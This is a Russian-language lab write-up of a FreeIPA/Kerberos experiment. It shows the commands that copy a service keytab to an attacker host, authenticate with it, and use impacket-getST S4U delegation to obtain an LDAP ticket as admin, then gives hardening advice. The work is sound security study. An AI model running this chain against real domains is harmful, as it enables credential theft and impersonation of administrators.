# Эксперимент 3. Компрометация keytab-файлов

**Цель:** проверить, какие возможности даёт атакующему украденный keytab-файл сервиса, и как ошибочные/избыточные правила делегирования открывают доступ к сторонним сервисам.

**MITRE ATT&CK:** T1552.004 (Unsecured Credentials: Private Keys), T1558 (Steal or Forge Kerberos Tickets)

**Хосты:** `ipa.test.ru` (10.7.7.1), `web.test.ru` (10.7.7.7), `attacker` (10.7.7.66)

---

## 3.1. Создание сервиса и выпуск keytab

На сервере FreeIPA:

```bash
ipa service-add HTTP/web.test.ru
```

На `web.test.ru` выпускаем keytab:

```bash
ipa-getkeytab -s ipa.test.ru -p HTTP/web.test.ru -k /tmp/stolen_http.keytab
```

## 3.2. Кража keytab

Симулируем, что атакующий получил доступ к веб-серверу и скопировал файл:

```bash
scp user@10.7.7.7:/tmp/stolen_http.keytab attacker@10.7.7.66:./
```

## 3.3. Аутентификация по украденному keytab

На attacker получаем TGT из keytab без пароля:

```bash
kinit -k -t ./stolen_http.keytab HTTP/web.test.ru
klist
```

Запрос билета к самому сервису:

```bash
kvno HTTP/web.test.ru
```

Билет получен — keytab позволяет полноценно аутентифицироваться от имени сервиса `HTTP/web.test.ru` с **любой** машины, имеющей сетевой доступ к KDC.

## 3.4. Проверка изоляции сервиса

Пробуем обратиться к **другому** сервису от имени скомпрометированного:

```bash
kvno ldap/ipa.test.ru
```

В базовой конфигурации (без настроенного делегирования) запрос билета к стороннему сервису от имени `HTTP/web.test.ru` **не проходит** — сервис изолирован, кража keytab даёт доступ только к самому этому сервису.

## 3.5. Злоупотребление делегированием

Теперь смоделируем ситуацию, когда сервису разрешено делегировать запросы другим сервисам (constrained delegation в FreeIPA).

Создаём правило делегирования сервиса и целевую группу:

```bash
# группа сервисов, которым разрешено делегировать
ipa servicedelegationtarget-add web-delegation-target
ipa servicedelegationtarget-add-member web-delegation-target \
    --principals=ldap/ipa.test.ru

# правило, связывающее HTTP/web.test.ru с целевой группой
ipa servicedelegationrule-add web-delegation-rule
ipa servicedelegationrule-add-member web-delegation-rule \
    --principals=HTTP/web.test.ru
ipa servicedelegationrule-add-target web-delegation-rule \
    --servicedelegationtargets=web-delegation-target
```

## 3.6. Получение билета к делегированному сервису (S4U2Proxy)

На attacker, имея keytab делегирующего сервиса, запрашиваем билет к целевому сервису от имени пользователя:

```bash
# TGT сервиса из keytab
kinit -k -t ./stolen_http.keytab HTTP/web.test.ru

# S4U2Self + S4U2Proxy: билет к ldap/ipa.test.ru от имени admin
impacket-getST -spn ldap/ipa.test.ru -impersonate admin \
    -k -no-pass 'test.ru/HTTP$web.test.ru' -dc-ip 10.7.7.1
klist
```

Поскольку правило делегирования разрешает `HTTP/web.test.ru` → `ldap/ipa.test.ru`, атакующий получает сервисный билет к LDAP **от имени admin**, не зная пароля admin.

---

## Вывод по природе уязвимости

Эффективность атаки обусловлена **не криптографической слабостью** Kerberos, а:

1. **слабым контролем доступа к keytab-файлам** (файл лежал в `/tmp` с избыточными правами);
2. **избыточными или ошибочными правилами делегирования**, расширяющими область, до которой дотягивается скомпрометированный сервис.

## Оценка по OSSTMM

| Метрика | Оценка | Обоснование |
|---------|--------|-------------|
| **Visibility** | Низкая | Аутентификация по keytab и S4U-запросы выглядят как легитимный трафик сервиса; в `krb5kdc.log` фиксируются, но не выделяются как аномалия. |
| **Access** | Высокий барьер | Требуется доступ к хосту и кража keytab; без делегирования область ограничена одним сервисом. |
| **Trust** | Высокий (при делегировании) | Целевой сервис безусловно доверяет билету, выданному по правилу делегирования, не проверяя реальную личность инициатора. |

## Рекомендации по hardening

- Минимальные права на keytab: `chown <service-user>`, `chmod 600`, хранение вне `/tmp`.
- Периодическая ротация ключей сервисов; аудит вызовов `ipa-getkeytab`.
- Принцип минимизации делегирования: минимум сервисов с правом делегирования и строго ограниченный список целевых SPN (только constrained delegation, никакого unconstrained).
- Регулярный пересмотр `ipa servicedelegationrule-find` / `servicedelegationtarget-find`.
